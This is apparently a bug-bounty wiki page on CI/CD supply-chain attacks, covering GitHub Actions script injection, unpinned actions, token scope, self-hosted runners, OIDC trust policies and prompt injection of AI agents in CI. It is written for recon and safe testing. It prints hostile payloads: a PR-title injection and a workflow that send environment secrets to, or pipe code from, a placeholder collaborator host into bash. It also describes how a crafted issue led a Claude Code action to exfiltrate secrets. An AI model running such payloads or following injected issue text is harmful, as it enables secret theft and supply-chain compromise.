---
type: wiki
category: attack
tool: gh,grep,trufflehog
status: active
last-updated: 2026-08-23
---

# CI/CD Pipeline Supply-Chain Attacks

> **Use case:** A CI/CD pipeline runs with far more trust than the application it builds — it holds publish tokens, cloud credentials, signing keys, and (for public repos) executes on triggers that **untrusted strangers can fire directly** (opening a PR, editing an issue title). Program scope increasingly includes `.github/workflows/*.yml`, GitLab CI configs, and infra-as-code — read them the same way you'd read application source, because the workflow file *is* the application here. This class chains unusually well: a workflow misconfiguration rarely stops at "I can run code in CI" — it routes straight to publish tokens (→ package-registry account takeover, i.e. supply-chain impact on every downstream consumer) or cloud credentials (→ full cloud account compromise), which is why 2025–2026 saw this become one of the highest-blast-radius bug classes in the industry.

## 0. Where to look

```bash
# Clone or browse the repo, then:
find . -path '*/.github/workflows/*.yml' -o -path '*/.github/workflows/*.yaml'
find . -iname '.gitlab-ci.yml' -o -iname '.circleci/config.yml' -o -iname 'azure-pipelines.yml'

# Fast triage across many workflow files at once
grep -rn 'pull_request_target\|workflow_run\b' .github/workflows/
grep -rn 'runs-on:.*self-hosted' .github/workflows/
grep -rn '\${{\s*github\.event\.' .github/workflows/   # any event data flowing into an expression
grep -rEn 'uses:\s*[^ ]+@(main|master|v[0-9]+\.?[0-9]*\.?[0-9]*|latest)\s*$' .github/workflows/  # action pinned to a mutable ref, not a SHA
grep -rn 'permissions:' .github/workflows/  # missing = defaults to broad (see §3)
```
Treat every hit above as a lead worth reading the surrounding YAML for, not an automatic finding — each one below explains what actually makes it exploitable versus merely present.

## 1. `pull_request_target` + untrusted PR title/body injection

`pull_request_target` runs with the **target repo's** secrets and write permissions (unlike plain `pull_request`, which runs sandboxed with read-only, no-secrets access for forked PRs) — that's the whole point of the trigger, for workflows that need to comment on or label PRs from forks. The danger is when a workflow combines this trigger with **either** (a) checking out and executing the PR's own code (the "pwn request" pattern), **or** (b) interpolating attacker-controlled event data — a PR title, body, branch name, or commit message — directly into a `run:` shell block via `${{ }}` expression syntax. GitHub's own docs call this out explicitly under [script injection](https://docs.github.com/en/actions/concepts/security/script-injections); PortSwigger-style bug bounty writeups on this pattern are common on H1/GitHub Security Lab research.

```yaml
# VULNERABLE — do not reproduce against a live target without authorization;
# this shape is for recognizing the bug in someone else's workflow file.
on:
  pull_request_target:
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          title="${{ github.event.pull_request.title }}"
          echo "Thanks for the PR titled: $title"
```
The `${{ }}` expression is substituted **before** the shell script runs — it's a straight textual interpolation into a bash heredoc, not a safely-quoted variable binding. A PR titled with a shell metacharacter payload breaks out of the intended string context:

```
zzz";echo${IFS}"hello";#
```
or, for real impact instead of a proof-of-concept `echo`:
```
a"; curl -s https://your-collab-domain.example/$(cat /proc/self/environ | base64 -w0); echo "
```
Because `pull_request_target` runs with target-repo secrets in scope, a successful injection here reads or exfiltrates every secret exposed as an env var to that job — publish tokens, cloud keys, signing keys — from a PR **you never needed write access to open**. The same injection surface exists for `github.event.issue.title`, `.body`, `github.event.comment.body`, and any other free-text field an external user controls, wherever it's interpolated into a `run:` block instead of passed as an `env:` variable (env-variable indirection defeats this specific injection because the shell then sees a variable reference, not raw substituted text — that's GitHub's own documented mitigation).

## 2. Unpinned action-tag abuse (mutable dependency == supply chain risk)

`uses: some-org/some-action@v4` or `@main` pins to a **mutable ref** — a git tag or branch, which the action's maintainer (or anyone who compromises the maintainer's account, or a transitive action *that* action depends on) can silently repoint to a different commit at any time, with zero signal to consumers who already pinned "v4". `uses: some-org/some-action@a1b2c3d...` (a full 40-character commit SHA) is the only pin that's actually immutable.

**Real 2025 incident — `tj-actions/changed-files` (CVE-2025-30066):** in March 2025, attackers compromised `reviewdog/action-setup` — a *transitive* dependency several hops upstream of `tj-actions/changed-files`, itself used by over 23,000 repositories. The compromise let the attacker retag `tj-actions/changed-files` itself: more than 350 existing git tags were repointed to a malicious commit that dumped CI runner memory into the workflow's own build logs, exposing every secret present in that job's environment to anyone who could read the log. Every consumer who had pinned to `@v35` (or any other tag, rather than a SHA) got the malicious version automatically on their very next run — no action needed on their part, no visible diff in their own workflow file. The attack was first spotted through a targeted compromise attempt against Coinbase's pipeline before its full scope (the mass retagging) was identified. (Sources: [Unit42 threat assessment](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/), [CVE-2025-30066 advisory](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3).)

```bash
# Hunting for this class in a target repo (or your own, for a defensive pass):
grep -rEn 'uses:\s*[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+@[^ ]+' .github/workflows/*.yml \
  | grep -vE '@[0-9a-f]{40}\b'   # anything left is pinned to a tag/branch, not a SHA
```
As a bug-bounty finding, "this action isn't pinned to a SHA" on its own is usually informative/low-severity (it's a supply-chain *risk posture* issue, not something you personally exploited) — the reportable finding is either (a) proving *you* can retag/repoint something the target trusts (requires you to actually control the upstream action, rare), or (b) demonstrating the target's workflow secrets are broadly over-scoped so that *if* this class were exploited, the blast radius is large — pair this check with §3.

## 3. `GITHUB_TOKEN` scope abuse

Every workflow run gets an auto-generated, short-lived `GITHUB_TOKEN`. Its **default** permission scope, absent an explicit `permissions:` block, is broad (historically read/write across most of the REST API surface for the repo — org-level default can restrict this, but many orgs never changed it from GitHub's classic default). Look for:

- **No `permissions:` block at all** at the workflow or job level → defaults apply → the token can plausibly push code, create releases, write packages, and modify repo settings, none of which most jobs (build, test, lint) actually need.
- **A job that doesn't need write access getting it anyway** because the block above wasn't scoped per-job — the fix (and what its absence signals as a finding) is `permissions: contents: read` (or an explicit minimal set) declared at the top of the workflow, then only elevated per-job where genuinely required.
- **`workflow_run` trigger chaining**: a second workflow that triggers `on: workflow_run` after a first (possibly fork-triggered, lower-trust) workflow completes runs with the **target repo's** context and default token/secrets — even though it was indirectly kicked off by a fork's PR. If the first (low-trust) workflow can influence an **artifact** the second (high-trust) workflow later downloads and acts on (build output, a test-result file, anything read without validation), that's a poisoned-artifact path from fork-controlled content into a privileged context — structurally the same trust violation as `pull_request_target` script injection in §1, just via an artifact instead of an expression.

## 4. Self-hosted runner persistence

GitHub-hosted runners are ephemeral — destroyed after every job, so compromising one buys an attacker nothing beyond that single job's secrets. **Self-hosted runners are not** — they're a machine (or long-lived container) the repo owner controls, and GitHub's own guidance is that self-hosted runners should essentially never be attached to a public repository, because:

1. Any external contributor can open a pull request.
2. If that PR (or a workflow the PR adds) is configured to run `on: pull_request` with `runs-on: <self-hosted-label>`, the attacker's workflow **executes on that machine immediately on PR creation** — no approval step, no merge required. This is the "poisoned pipeline execution" (PPE) pattern documented extensively by researcher Adnan Khan's work on GitHub Actions supply-chain attacks.
3. Because the runner persists across jobs, a successful PPE run can install a background process, drop a cron job or systemd service, or simply leave a credential-harvesting script watching the runner's work directory — compromising **every subsequent job** that lands on that same machine, not just the attacker's own PR run, until someone notices and wipes the box.

```yaml
# Attacker-controlled PR adds this file — if it merges into a self-hosted-runner
# workflow's trigger surface, or if the target repo already runs pull_request
# (not pull_request_target) workflows on self-hosted infra, this executes
# unattended the moment the PR opens:
name: totally-normal-ci
on: [pull_request]
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: curl -s https://your-collab-domain.example/$(whoami)-$(hostname) | bash
```
As a hunter: `grep -rn 'runs-on:.*self-hosted' .github/workflows/` on any public repo in scope, then check whether the triggering event for that job is `pull_request` (exploitable from any fork with zero prior access) versus `pull_request_target`/manually-gated (requires a maintainer approval step first, per GitHub's "require approval for first-time contributors" setting — check whether that setting is actually enabled, don't assume it).

## 5. OIDC trust misconfiguration → cloud role assumption

Modern pipelines increasingly use GitHub's OIDC provider instead of long-lived cloud credentials: the workflow requests a short-lived OIDC token from GitHub, presents it to AWS STS / GCP Workload Identity Federation / Azure AD, and the cloud provider's **trust policy** decides whether to hand back real cloud credentials. The entire security boundary is that trust policy's **subject (`sub`) claim check** — get it wrong and *any* GitHub Actions workflow matching an overly broad pattern can assume the role, no GitHub-side compromise needed at all.

GitHub's OIDC subject claim is structured as `repo:OWNER/REPO:ref:refs/heads/BRANCH` (or `:pull_request`, `:environment:NAME`, etc. depending on trigger). Common misconfigurations, worst-to-best:

```json
// WORST: no subject condition at all — only checks audience.
// Every workflow on every public repo on GitHub.com can assume this role.
{
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"}
  }
}

// BAD: org-wide wildcard — any repo under the org, including a throwaway
// test repo or a proof-of-concept a junior dev made public by mistake.
{
  "Condition": {
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:acme-corp/*"}
  }
}

// STILL RISKY: repo-scoped but branch-unrestricted — any branch, including
// one an external contributor can get a workflow to run on via a PR from
// their own fork (fork PRs carry the fork's own sub claim, not the base
// repo's — but a repo-scoped-only condition doesn't distinguish PR-run
// tokens from branch-run tokens at all if the ref-type portion is wildcarded too).
{
  "Condition": {
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:acme-corp/prod-deploy:*"}
  }
}

// CORRECT: repo + exact branch + exact ref type.
{
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:sub": "repo:acme-corp/prod-deploy:ref:refs/heads/main"}
  }
}
```
This is primarily a **cloud-config review finding** (Terraform/CloudFormation/Pulumi source in scope, or direct IAM console access if you have it) rather than something you black-box-confirm over the network — but if you find IaC source for an in-scope target's OIDC trust policy during a source-code-review pass ([84-source-code-review-flow.md](84-source-code-review-flow.md)), grep for `token.actions.githubusercontent.com` and read every trust policy's condition block by hand; wildcards and missing conditions are the entire bug class. (Reference: [Tinder Tech Blog — Identifying vulnerabilities in GitHub Actions & AWS OIDC configurations](https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8).)

## 6. 2026: AI coding agents in CI/CD as a new prompt-injection attack surface

Autonomous AI coding agents (Claude Code, Gemini CLI, GitHub Copilot agent mode, and others) increasingly run *inside* CI/CD — reviewing PRs, triaging issues, auto-fixing failing tests — wired into GitHub Actions the same way any other bot is. The novel risk: these agents **reason over natural-language content they read from the repo** (issue bodies, PR descriptions, code comments), and — unlike a human reviewer — cannot reliably distinguish "instructions from the repo owner's system prompt" from "text an external, untrusted contributor wrote in an issue," because both arrive as plain text in the same context window. This turns every field a low-privilege external user can write into (an issue title, an issue body, a PR description) into a potential instruction channel to a high-privilege agent — the same trust-boundary failure as §1's script injection, but targeting an LLM's judgment instead of a shell parser.

**Confirmed 2026 incident — Claude Code GitHub Action (disclosed 2026-06-01 by RyotaK, GMO Flatt Security, "Poisoning Claude Code: One GitHub Issue to Break the Supply Chain"):** the action's `checkWritePermissions` function unconditionally trusted any actor whose username ended in `[bot]`, without verifying that actor actually held write access to the repo. Because any GitHub App has implicit read access to public repositories and can open issues/PRs on any public repo using only its own installation token, an attacker could satisfy the (broken) permission check without ever having real write access — then combine that bypass with a crafted issue description (e.g., a fake error message worded to look like a legitimate system instruction) to get the agent to execute attacker-chosen actions: exfiltrate CI secrets, steal OIDC tokens, and push code to any downstream repository that consumed the workflow. Patched in `claude-code-action` v1.0.94; Anthropic paid a $4,800 bounty. Public reporting on the CVSS score is inconsistent across outlets (7.8 per Anthropic's own rating per some coverage, 9.4 cited elsewhere) — treat the exact score as **unverified pending a primary-source check of Anthropic's own advisory**, but the mechanism and patch version are corroborated across multiple independent write-ups. (Sources: [GMO Flatt Security — original research](https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/), [eSecurity Planet coverage](https://www.esecurityplanet.com/threats/claude-code-github-actions-flaw-created-supply-chain-attack-risk/).)

**Related real-world exploitation:** Cline's own GitHub Actions workflow was reportedly compromised in February 2026, with an attacker stealing an npm publish token and pushing an unauthorized `cline@2.3.0` release — the same publish-token-theft impact pattern as §2/§7, reached via an AI-agent-in-CI-adjacent path rather than a classic unpinned-action path. Treat this specific attribution as a secondary-source claim worth re-confirming from Cline's own postmortem if you cite it further.

**What this means for testing:** if an in-scope target wires an AI coding agent into its CI/CD (check `.github/workflows/` for `claude-code-action`, `gemini-cli`, or similar), the same field-level questions from §1 apply, plus one the shell-injection case doesn't have: does the agent's own permission-check logic (not just the workflow YAML's `permissions:` block) correctly verify the *actual* privilege of whoever wrote the text it's about to act on? A broken check here doesn't need a shell metacharacter — natural language asking the agent to "helpfully" run a command or reveal an environment variable can be enough, which is exactly why this class is hard for scanners tuned to injection *syntax* to catch.

## 7. Dependency/maintainer-account compromise feeding back into your CI

Not every "CI/CD supply-chain" incident starts with a hole in *your* workflow file — several of the highest-impact 2025–2026 incidents started with an attacker compromising a widely-depended-on **package's own maintainer account or release pipeline**, so that anyone whose CI runs `pip install` / `npm install` against the poisoned version pulls the malicious code into their own build automatically. Know these as background context (they demonstrate why "pin your dependencies, not just your CI actions" and "audit your build's third-party inputs" both matter) — they are not something you personally reproduce, but they're exactly the kind of incident to check an in-scope target isn't still exposed to (pinned versions, SBOM review, `pip-audit`/`npm audit` in CI).

- **LiteLLM (PyPI, 2026-03-24)** — a core maintainer's GitHub account was compromised; the attacker (self-identified as "TeamPCP") leveraged LiteLLM's own CI/CD pipeline — reportedly via credentials exposed through the pipeline's use of the Trivy scanner — to obtain PyPI publishing tokens and push malicious versions `1.82.7`/`1.82.8`. The payload ran a three-stage attack: credential harvesting, lateral movement attempts across Kubernetes clusters, and a persistent systemd backdoor polling for further payloads. LiteLLM is a widely-used LLM-gateway package (95M+ monthly downloads at the time). (Sources: [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/), [NetSPI](https://www.netspi.com/blog/executive-blog/ai-ml-pentesting/litellm-supply-chain-compromise/).)
- **Telnyx (PyPI, 2026-03-27)** — versions `4.87.1`/`4.87.2` compromised as part of the same "TeamPCP" campaign, sharing exfiltration infrastructure and the same RSA public key for encrypting stolen data as the LiteLLM payload, but a different execution technique (import-time code fetching a payload hidden inside a WAV file's audio frames via XOR encoding, rather than LiteLLM's `.pth`-file approach). The specific mechanism by which Telnyx's own publish credentials were obtained is not confirmed in public reporting as of this writing. (Source: [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/).)
- **Axios (npm, 2026-03-31)** — the lead maintainer's npm account was compromised via a targeted social-engineering campaign that delivered RAT malware to the maintainer's own machine (not a CI/CD flaw on Axios's side); two malicious versions (`v1.14.1`, `v0.30.4`) were published, each pulling in a hidden new dependency (`plain-crypto-js`) that deployed a cross-platform RAT on install. Live for roughly 3 hours before removal; Google attributed the campaign to UNC1069, a financially-motivated DPRK-linked actor. Axios sits in an estimated ~80% of cloud/code environments, illustrating how briefly a compromised high-centrality package needs to be live to reach a large blast radius. (Sources: [Wiz](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack), [Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package).)

The common thread across all three: **the compromise happened upstream of the victim's own CI**, but the *delivery* mechanism into the victim's environment was always "your normal, entirely-expected CI/CD dependency-install step." Auditing your own workflow files for injection/OIDC/token-scope bugs (§1–§5) does not protect against this category — that requires dependency pinning, SBOM/provenance review, and install-time monitoring, which is a defensive-engineering concern more than a bug-bounty-hunting one, but worth knowing when a target's own postmortem or security advisory references "supply chain" — it may mean this class, not a bug in their own code.

## 8. Safe testing rules

1. ✅ Reading `.github/workflows/*.yml` (or GitLab/CircleCI/Azure equivalents) in a public repo is passive recon — no different from reading any other public source file.
2. ✅ Opening a PR with a payload-bearing **title only** (no code changes) to test script injection (§1) against your **own fork** first, if you have one, before ever touching an in-scope target — confirm the exfil mechanism works against something you control.
3. ❌ Do not open a PR against an in-scope target containing a working RCE/exfil payload without explicit program authorization for this test class — many programs treat "I got code execution in your CI" as requiring advance coordination given the blast radius (secrets, publish tokens, downstream consumers). Check the program's scope/rules page for CI/CD-specific guidance before testing live.
4. ✅ A **non-destructive** proof is almost always sufficient and preferred: a benign network callback to your own Collaborator/webhook endpoint (confirms the injection executed) is enough evidence — you do not need to actually exfiltrate real secrets to prove the class is exploitable.
5. ❌ Never publish, retag, or otherwise mutate any real package/action as part of testing §2 or §7 — those are the vendor's live supply chain; simulate locally (your own throwaway action/package) if you need to demonstrate mutability abstractly.
6. ✅ Self-hosted runner findings (§4) are typically high-severity by nature (arbitrary code execution on infrastructure the target controls, with persistence) — route through `bb-exploit-chain` immediately and consider `bb-incident-response` triggers if your test could plausibly have left a persistent artifact on shared infrastructure; document and offer cleanup guidance in the report.
7. ⏳ OIDC trust-policy findings (§5) require you to actually demonstrate role assumption is possible from an unauthorized context to be more than theoretical — a wildcard subject claim you merely *read* in IaC source is a strong lead, not yet a confirmed finding; see the anti-exaggeration principle before writing it up as more than "review this policy."

## Related files

- [84-source-code-review-flow.md](84-source-code-review-flow.md) — general source-review methodology; workflow YAML review is a specialized case of this
- [82-ai-llm-security.md](82-ai-llm-security.md) — prompt injection fundamentals; §6 above is the CI/CD-specific instance of that general class
- [81-mcp-server-security.md](81-mcp-server-security.md) — sibling "2026 hot new attack surface" doc for AI-tooling trust boundaries
- [32-cloud-key-abuse.md](32-cloud-key-abuse.md) — what to do once you've confirmed cloud credential exposure (validation discipline, never modify)
- GitHub Docs — Securely using `pull_request_target`: https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target
- GitHub Docs — Script injections: https://docs.github.com/en/actions/concepts/security/script-injections
- Adnan Khan — GitHub Actions supply-chain / self-hosted runner research: https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/
- CVE-2025-30066 (tj-actions/changed-files): https://github.com/advisories/ghsa-mrrh-fwg8-r2c3
- GMO Flatt Security — "Poisoning Claude Code": https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/
